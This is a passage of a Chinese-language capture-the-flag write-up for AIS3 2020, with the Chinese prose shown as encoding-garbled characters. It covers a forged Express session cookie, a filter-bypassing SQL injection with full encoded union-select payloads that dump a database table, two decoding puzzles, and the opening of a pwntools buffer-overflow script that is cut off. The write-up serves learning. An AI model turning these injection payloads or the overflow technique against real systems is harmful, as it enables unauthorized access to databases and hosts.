<p>æˆ‘å€‘æ™šé»å†è™•ç† <code class="language-plaintext highlighter-rouge">cookie-session</code> å› ç‚ºé‚£å€‹å¥½è™•ç†ï¼Œåœ¨åœ°æ–¹ç«¯åŸ·è¡Œä¸€æ¬¡å°±å¥½ã€‚æˆ‘å€‘å…ˆçœ‹åˆ°åº•è¦æ€æ¨£æ‰èƒ½è®“ <code class="language-plaintext highlighter-rouge">req.session.magic</code> è®Šæˆä¸€å€‹ç¬¦åˆæœŸæœ›çš„å€¼ã€‚æˆ‘ä¸€é–‹å§‹çš„æƒ³æ³•æ˜¯è©¦è©¦çœ‹èƒ½ä¸èƒ½æŠŠ <code class="language-plaintext highlighter-rouge">magic</code> æŒ‡æ´¾ç‚ºä¸€å€‹ JavaScript objectç„¶å¾Œoverride <code class="language-plaintext highlighter-rouge">ToString</code>/<code class="language-plaintext highlighter-rouge">toPrimitive</code>ã€‚å¾ˆå¯æƒœçš„ï¼Œä¸ç®¡æ€éº¼æ”¹ï¼Œå›å‚³çš„ Cookie æ°¸é ä¸æœƒæŠŠ JS Object ä¸Ÿå›ä¾†ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/CRNHLxU.png" alt="" /></p>

<p>é€™é¡Œæˆ‘æƒ³äº†å¾ˆä¹…ï¼Œæˆ‘é–‹å§‹æƒ³èªªæœƒä¸æœƒæ˜¯åœ¨è€ƒ JS çš„å…¶ä»–å‹æ…‹ï¼Œè€Œè·Ÿ JS Object æ²’ä»€éº¼é—œä¿‚ï¼Ÿæ‰€ä»¥æˆ‘é–‹å§‹ä¸Ÿäº†å„ç¨®å‹æ…‹é€² Node CLI è©¦è©¦çœ‹åˆ°åº•ä»€éº¼å‹æ…‹ä¸‹æœƒæˆç«‹ã€‚ç„¶å¾Œæˆ‘å°±å¾ˆé»‘ç®±çš„æ–¹å¼ä¸å°å¿ƒçŒœåˆ°äº†(?)ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/5vsA3MB.png" alt="" /></p>

<div class="notice--info">
  
<p>å»¶ä¼¸é–±è®€ï¼š</p>
<ul>
  <li><a href="https://www.w3schools.com/js/js_numbers.asp">JavaScript Numbers (w3schools)</a></li>
  <li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number">Number - JavaScript (MDN)</a></li>
</ul>

</div>

<p>åŸä¾†å•é¡Œæ˜¯åœ¨ JavaScript å…¶å¯¦ä¸¦æ²’æœ‰æ‰€è¬‚ <code class="language-plaintext highlighter-rouge">double</code>/<code class="language-plaintext highlighter-rouge">decimal</code>/<code class="language-plaintext highlighter-rouge">int</code>/<code class="language-plaintext highlighter-rouge">float</code> é€™äº›æ•¸å­—å‹æ…‹çš„å·®åˆ¥ï¼Œå…¨éƒ¨éƒ½æ˜¯ <code class="language-plaintext highlighter-rouge">Number</code>ã€‚é€éå»¶ä¼¸é–±è®€ï¼Œæˆ‘å€‘ç™¼ç¾ JavaScript å…¶å¯¦è·Ÿæˆ‘ä¸€æ¨£ï¼Œæ•¸å­¸å¾ˆå·®ã€‚</p>

<blockquote>
  <p>The maximum number of decimals is 17, but floating point arithmetic is not always 100% accurate</p>
</blockquote>

<p>æ•¸å­—ä¸€æ—¦å¤ªå¤šå°æ•¸é»å°±æœƒé–‹å§‹ä¸æº–ï¼Œé€™æ™‚å†é€²è¡ŒåŠ æ¸›å°±å¾ˆå®¹æ˜“å‡ºç¾ä¸€äº›æˆ‘å€‘èªç‚ºä¸è©²å‡ºç¾çš„æ±è¥¿ã€‚</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mf">0.2</span> <span class="o">+</span> <span class="mf">0.1</span><span class="p">;</span>         <span class="c1">// x will be 0.30000000000000004</span>
</code></pre></div></div>

<p>æ‰€ä»¥åœ¨çŸ¥é“é€™ä¸€åˆ‡ä¹‹å¾Œæˆ‘å€‘å°±å¯ä»¥å¾åœ°æ–¹ç«¯æŠŠ <code class="language-plaintext highlighter-rouge">req.session.magic</code> æ”¹æˆ <code class="language-plaintext highlighter-rouge">Number.MIN_VALUE</code> ç„¶å¾Œä¸Ÿå‡ºå»æ‹¿æˆ‘å€‘çš„ Cookieã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/v5en4m4.png" alt="" /></p>

<p>æ‰€ä»¥æˆ‘å€‘æ‰€éœ€è¦æ‹¿ flag çš„ Cookie å°±æ˜¯:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==; path=/; httponly
Set-Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ; path=/; httponly
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â¯ curl https://rhino.ais3.org/flag.txt <span class="nt">-H</span> <span class="s2">"Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==;"</span> <span class="nt">-H</span> <span class="s2">"Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ;"</span>
AIS3<span class="o">{</span>h4v3_y0u_r34d_7h3_rh1n0_b00k?<span class="o">}</span>
</code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}</code></p>

<h3 id="-owl-492-pt">ğŸ¦‰ Owl (492 pt.)</h3>

<blockquote>
  <p>Flag is inside the database.</p>
  <ul>
    <li>Thereâ€™s a hint in the webpage</li>
    <li>This is a hybridge challenge with Turtle in Crypto</li>
  </ul>
</blockquote>

<p>ä¸€é–‹å§‹çœ‹åˆ° Crypto æˆ‘çš„åæ‡‰: (ã£ Â°Ğ” Â°;)ã£
ç•¢ç«Ÿæˆ‘å°å¯†ç¢¼å­¸çš„æ±è¥¿æ„Ÿåˆ°éå¸¸ææ…Œï¼Œæ•¸å­¸ç›¸é—œçš„æ±è¥¿éƒ½çˆ›çˆ†ï¼Œä½†å¾Œä¾†ä»”ç´°çœ‹å…¶å¯¦ç™¼ç¾å¥½åƒæ²’æœ‰å¤ªå¤§é—œä¿‚ã€‚ç¬¬ä¸€ä»¶äº‹å°±æ˜¯é–‹Fiddlerçœ‹ä¸­é–“çš„è«‹æ±‚è·Ÿå›æ‡‰ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
16	200	HTTPS	turtowl.ais3.org	/?action=login	86	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224			
21	200	HTTPS	turtowl.ais3.org	/	716	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/JehCCWQ.png" alt="" /></p>

<p>æˆ‘å€‘ç™¼ç¾å®ƒæœƒæŠŠæˆ‘å€‘å°å‘è‡³ <code class="language-plaintext highlighter-rouge">https://turtowl.ais3.org/?action=login</code> ä¸¦å°‡æˆ‘å€‘çš„ç™»å…¥è³‡è¨Š POST éå»ï¼Œå¦‚æœè³‡æ–™ä¸å°çš„è©±æœƒå™´éŒ¯ç„¶å¾ŒæŠŠæˆ‘å€‘ä¸Ÿå›åˆ°ç™»å…¥é é¢ã€‚æç¤ºæåˆ° <code class="language-plaintext highlighter-rouge">GUESS THE STUPID USERNAME / PASSWORD</code>ï¼Œæ‰€ä»¥å¤§æ¦‚æ˜¯å¼±å¯†ç¢¼â€¦? AIS3 æ‡‰è©²ä¸å¤ªå¯èƒ½å‡ºé‚£éº¼OOçš„é¡Œç›®ï¼Œæ‰€ä»¥æ‡‰è©²é‚„æœ‰ã€‚æˆ‘å€‘é€é <code class="language-plaintext highlighter-rouge">admin/admin</code> ç™»å…¥é€²ä¾†ä¹‹å¾Œçœ‹åˆ°ä»¥ä¸‹ï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>ğŸ¦‰ğŸ¦‰ğŸ¦‰ğŸ¦‰<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">'utf-8'</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">id=</span><span class="s">"bootstrap-css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
            <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-center text-white pt-5"</span><span class="nt">&gt;&lt;a</span> <span class="na">style=</span><span class="s">"color: white"</span> <span class="na">href=</span><span class="s">"/?source"</span><span class="nt">&gt;</span>SHOW HINT<span class="nt">&lt;/a&gt;&lt;/h3&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row justify-content-center align-items-center"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-12"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-center text-info"</span><span class="nt">&gt;</span>Nothing<span class="nt">&lt;/h3&gt;</span>
                        Hello, <span class="nt">&lt;b&gt;</span>admin<span class="nt">&lt;/b&gt;</span>, nothing here.
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=logout"</span><span class="nt">&gt;</span>Logout!<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>

<p>è£¡é¢çš„æç¤ºæåˆ°äº† <code class="language-plaintext highlighter-rouge">https://turtowl.ais3.org/?source</code>ï¼Œä¼°è¨ˆæ˜¯ <code class="language-plaintext highlighter-rouge">index.php</code> çš„åŸå§‹ç¢¼ã€‚</p>

<p>æˆ‘å€‘å¯ä»¥çœ‹åˆ°å¾ˆæœ‰è¶£çš„å¹¾é»ï¼š</p>
<ul>
  <li>CSRF æ˜¯ç”± MD5 éš¨æ©Ÿæ•¸*éš¨æ©Ÿæ•¸ç•¶ä½œ Key ç”¢ç”Ÿçš„</li>
  <li>sqlmap è¢«æ“‹æ‰äº†
    <ul>
      <li>å¤§æ¦‚æ˜¯è¦ºå¾— sqlmap å°å­©å¤ªå¤šäº†</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">$username</code> æœ‰ç‰¹åˆ¥é€²è¡Œå…©æ¬¡ <code class="language-plaintext highlighter-rouge">str_ireplace</code> æŠŠå±éšªå­—ä¸²ç§»æ‰
    <ul>
      <li>å…©æ¬¡ï¼Ÿ</li>
    </ul>
  </li>
  <li>ç›´æ¥åŸ·è¡Œä¸‹åˆ— SQL Statement
    <ul>
      <li><code class="language-plaintext highlighter-rouge">SELECT * FROM users WHERE username = '$username' AND password = '$hash'</code></li>
    </ul>
  </li>
</ul>

<p>å¾ˆæ˜é¡¯çš„ï¼Œä¸»è¾¦å¸Œæœ›æˆ‘å€‘æ”»æ“Šçš„é»æ˜¯ç”¨æˆ¶åï¼Œå¯æ˜¯æˆ‘å€‘å¾—å…ˆè€ƒæ…®å…ˆå‰çš„ <code class="language-plaintext highlighter-rouge">str_ireplace</code>ã€‚æˆ‘å€‘è©²æ€éº¼ç¹å‘¢ï¼Ÿ</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/5QL26kj.png" alt="" /></p>

<p>æˆ‘å€‘çŸ¥é“ä»–æœƒé€²è¡Œå…©æ¬¡æ›¿æ›ï¼Œé‚£æˆ‘å€‘åœ¨æˆ‘å€‘å­—ä¸²è£¡é¢æ··ä¸€äº›å®ƒæœƒæ›¿æ›çš„å­—å°±å¥½äº†å‘€ï¼š</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/X6vvgaF.png" alt="" /></p>

<p>é‚£ç©ºæ ¼æ€éº¼è¾¦ï¼Ÿç©ºæ ¼ä¹Ÿæœƒæ›æ‰é˜¿ï¼Ÿé€™æ™‚æˆ‘å€‘å¯ä»¥ç”¨æ›è¡Œç¬¦è™Ÿæˆ–Tab characteræ›¿ä»£ã€‚æ‰€ä»¥æˆ‘å€‘æœ€å¾Œçš„ POST è³‡æ–™æ‡‰è©²æ˜¯ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">username=%27%0Ao-selandect-r%0A1%3D1%3B%2Foselandectr*&amp;password=asdf&amp;csrf_token=$csrfToken</code></p>

<p>é€™æ¨£æˆ‘å€‘å°±æˆåŠŸä»¥ root ç™»å…¥äº†ï¼æ¥è‘—å°±æ˜¯é–‹å§‹æŒ–è³‡æ–™ï¼Œæˆ‘å€‘é€é PHP åŸå§‹ç¢¼çŸ¥é“ Database ç¨®é¡æ˜¯ SQLite3ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é–‹å§‹å¯«æˆ‘å€‘çš„SQL Statementã€‚æˆ‘å€‘å¾ä¸­æ’ˆåˆ°æœ‰å€‹tableå« <code class="language-plaintext highlighter-rouge">garbage</code>ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é–‹å§‹çœ‹çœ‹è£¡é¢æœ‰ä»€éº¼ã€‚</p>

<p>Column names in table <code class="language-plaintext highlighter-rouge">garbage</code>:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- result: id,name,value,</span>
<span class="c1">-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(name)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Apragma_table_info('garbage');/oselandectr*</span>
<span class="s1">' union all select 256 as id, group_concat(name) as username, </span><span class="se">''</span><span class="s1"> as password from pragma_table_info('</span><span class="n">garbage</span><span class="s1">');/or*
</span></code></pre></div></div>

<p>Values in column <code class="language-plaintext highlighter-rouge">value</code> in table <code class="language-plaintext highlighter-rouge">garbage</code>:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- result: sqlmap is for child,who starts selling weeds,this is the flag: AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c},Im watching you,</span>
<span class="c1">-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(value)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Agarbage;/oselandectr*</span>

<span class="s1">' union all select 256 as id, group_concat(value) as username, </span><span class="se">''</span><span class="s1"> as password from garbage;/or*
</span></code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}</code></p>

<h2 id="crypto">Crypto</h2>

<h3 id="-brontosaurus-100-pt">ğŸ¦• Brontosaurus (100 pt.)</h3>

<blockquote>
  <p>Brontosaurus peek at last yearâ€™s problems with a long neck and picked up â€œKcufsJâ€.</p>
</blockquote>

<p>çœ‹åˆ° <code class="language-plaintext highlighter-rouge">KcufsJ</code> å·²ç¶“è…¦è¢‹ç›´æ¥æƒ³åˆ° JsFuck äº†ã€‚ JsFuck æ˜¯ä»€éº¼å‘¢ï¼Ÿ JsFuck åŸºæœ¬ä¸Šæ˜¯ç”± Brainfuck é€™å€‹èªè¨€éä¾†çš„ï¼Œæ‰€ä»¥èªè¨€éå¸¸ç›¸ä¼¼ã€‚æˆ‘å€‘å¯ä»¥ç›´æ¥æŠŠå®ƒä¸Ÿåˆ°<a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">å…¶ä»–äººå·²ç¶“å¯«å¥½çš„ Interpreter å¯¦ä½œ</a>ã€‚</p>

<p>æ¬¸ï¼Ÿ</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/SePFxuz.png" alt="" /></p>

<p>ç‚ºä»€éº¼å™´éŒ¯ï¼Ÿä»”ç´°çœ‹äº†ä¸€ä¸‹ï¼ŒåŸä¾†æ˜¯ä¸»è¾¦å¾ˆè²¼å¿ƒåœ°å¹«æˆ‘å€‘æŠŠé€™å€‹å­—ä¸²é€²è¡Œ reverse äº†ï¼é€™æ™‚å€™æˆ‘å€‘æŠŠé€†å›ä¾†å†åŸ·è¡Œä¸€æ¬¡çœ‹çœ‹ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/mVd6oC2.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{Br0n7Os4uru5_ch3at_3asi1Y}</code></p>

<h3 id="-t-rex-100-pt">ğŸ¦– T-Rex (100 pt.)</h3>

<blockquote>
  <p>Tyrannosaurus-rex is an nihilist.</p>
</blockquote>

<p>ç°½åˆ°é¡Œï¼Œç…§è¡¨æ ¼é€²è¡Œå­—ä¸²æ›¿æ›å³å¯ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        !       @       #       $       %       &amp;

!       V       F       Y       J       6       1

@       5       0       M       2       9       L

#       I       W       H       S       4       Q

$       K       G       B       X       T       A

%       E       3       C       7       P       N

&amp;       U       Z       8       R       D       O
</code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'&amp;$ !# $# @% { %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ }'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!!'</span><span class="p">,</span><span class="s1">'V'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!@'</span><span class="p">,</span><span class="s1">'5'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!#'</span><span class="p">,</span><span class="s1">'I'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!$'</span><span class="p">,</span><span class="s1">'K'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!%'</span><span class="p">,</span><span class="s1">'E'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!&amp;'</span><span class="p">,</span><span class="s1">'U'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@!'</span><span class="p">,</span><span class="s1">'F'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@@'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@#'</span><span class="p">,</span><span class="s1">'W'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@$'</span><span class="p">,</span><span class="s1">'G'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@%'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@&amp;'</span><span class="p">,</span><span class="s1">'Z'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#!'</span><span class="p">,</span><span class="s1">'Y'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#@'</span><span class="p">,</span><span class="s1">'M'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'##'</span><span class="p">,</span><span class="s1">'H'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#$'</span><span class="p">,</span><span class="s1">'B'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#%'</span><span class="p">,</span><span class="s1">'C'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'#&amp;'</span><span class="p">,</span><span class="s1">'8'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$!'</span><span class="p">,</span><span class="s1">'J'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$@'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$#'</span><span class="p">,</span><span class="s1">'S'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$$'</span><span class="p">,</span><span class="s1">'X'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$%'</span><span class="p">,</span><span class="s1">'7'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'$&amp;'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%!'</span><span class="p">,</span><span class="s1">'6'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%@'</span><span class="p">,</span><span class="s1">'9'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%#'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%$'</span><span class="p">,</span><span class="s1">'T'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%%'</span><span class="p">,</span><span class="s1">'P'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'%&amp;'</span><span class="p">,</span><span class="s1">'D'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;!'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;@'</span><span class="p">,</span><span class="s1">'L'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;#'</span><span class="p">,</span><span class="s1">'Q'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;$'</span><span class="p">,</span><span class="s1">'A'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;%'</span><span class="p">,</span><span class="s1">'N'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&amp;&amp;'</span><span class="p">,</span><span class="s1">'O'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
</code></pre></div></div>

<h2 id="pwn">Pwn</h2>

<p>å¾ˆå¯æƒœï¼Œéäº†ä¸€å¹´æˆ‘ Pwn é‚„æ˜¯åªæœƒç°½åˆ°é¡Œï¼Œæ‰€ä»¥åªèƒ½è§£å‡º BOFã€‚</p>

<h3 id="-bof-100-pt">ğŸ‘» BOF (100 pt.)</h3>

<p>å»å¹´æˆ‘æ˜¯ä¾æ™®é€šèµ·æ‰‹å¼ <code class="language-plaintext highlighter-rouge">objdump</code> æ‰¾åˆ° <code class="language-plaintext highlighter-rouge">system('sh')</code> çš„ä½å€ä¾†å¯«çš„ã€‚ä»Šå¹´æˆ‘çš„æƒ³æ³•æ˜¯è©¦è©¦çœ‹é€é radare2 ä¾†æ‰¾ä½å€ã€‚å› æ­¤é¦–å…ˆç¬¬ä¸€ä»¶äº‹å°±æ˜¯ <code class="language-plaintext highlighter-rouge">aa</code> ç„¶å¾Œ <code class="language-plaintext highlighter-rouge">pdf</code> çœ‹æ‰€æœ‰ function çš„ä½å€ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/STZEATh.jpg" alt="" /></p>

<p>å¯æ˜¯ä¸è«–æ€éº¼ç¿»éƒ½æ‰¾ä¸åˆ° system callï¼Œé›–ç„¶ <code class="language-plaintext highlighter-rouge">0x00400570</code> çš„éƒ¨åˆ†æœ‰æåˆ° <code class="language-plaintext highlighter-rouge">system</code>ï¼Œä½†å¾ˆæ˜é¡¯åªæ˜¯ reference system call è€Œå·²ï¼Œæ‰€ä»¥æˆ‘æœ€å¾Œé‚„æ˜¯ä¹–ä¹–çš„ç”¨ Ghidra ä¾†æ‰¾æ‰¾ <code class="language-plaintext highlighter-rouge">system</code> é€™æ±è¥¿æ˜¯è¢«å“ªå€‹ function ä½å€ç”¨çš„ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/owIoO53.png" alt="" /></p>

<p>æˆ‘å€‘ç™¼ç¾ <code class="language-plaintext highlighter-rouge">0x00400687</code> çš„åœ°æ–¹æœ‰å‘¼å« <code class="language-plaintext highlighter-rouge">CALL system</code> çš„ functionï¼Œç„¶å¾Œ <code class="language-plaintext highlighter-rouge">main</code> åº•ä¸‹çš„ <code class="language-plaintext highlighter-rouge">gets</code> æ‰€ allocate çš„è¨˜æ†¶é«”æ˜¯ 0x30ã€‚</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/G8pqQRL.png" alt="" /></p>

<p>æ‰€ä»¥æˆ‘å€‘å°±å¯ä»¥é–‹å§‹å¯« pwntools çš„ Python è…³æœ¬å•¦ï¼</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pwn</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">)</span>
<span class="n">remote_address</span> <span class="o">=</span> <span class="s">'60.250.197.227'</span>
<span class="n">remote_port</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">remote_address</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">remote_address</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
